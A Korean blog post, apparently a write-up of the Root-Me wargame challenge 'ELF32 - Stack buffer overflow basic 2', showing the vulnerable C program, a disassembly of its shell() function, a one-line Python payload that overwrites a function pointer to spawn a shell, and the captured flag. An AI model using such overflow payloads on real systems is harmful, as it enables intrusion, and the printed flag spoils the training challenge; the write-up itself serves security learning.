---
layout: post
title: "[root-me][app-system] ELF32 - Stack buffer overflow basic 2"
date: 2016-09-15 15:23:10
category: wargame
tags:  [root-me, bof]
---

root-me 의 BoF 두 번째 문제.
[Challenges/App - System : ELF32 - Stack buffer overflow basic 2 [Root Me : Hacking and Information Security learning platform]](https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-2)

<!--more--> 

## Code

```c
/*
gcc -m32 -fno-stack-protector -o ch15 ch15.c
*/
 
#include <stdio.h>
#include <stdlib.h>
 
void shell() {
    system("/bin/dash");
}
 
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
 
main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```

## Solve

이번에는 로컬 변수가 아니라 `*func()` function pointer 값을 변경해서 `sup()` 이 아니라 `shell()` 호출되도록 하면 된다.

```
void (*func)()=sup;
```

점프시킬 `shell()` 의 주소 확인.

```
08048464 <shell>:
 8048464:       55                      push   %ebp
 8048465:       89 e5                   mov    %esp,%ebp
 8048467:       83 ec 18                sub    $0x18,%esp
 804846a:       c7 04 24 a0 85 04 08    movl   $0x80485a0,(%esp)
 8048471:       e8 0a ff ff ff          call   8048380 <system@plt>
 8048476:       c9                      leave
 8048477:       c3                      ret
```




## Exploit



```bash
$ (python -c 'print "A"*128 + "\x64\x84\x04\x08"'; cat)  |./ch15

cat .passwd
B33r1sSoG0oD4y0urBr4iN
```

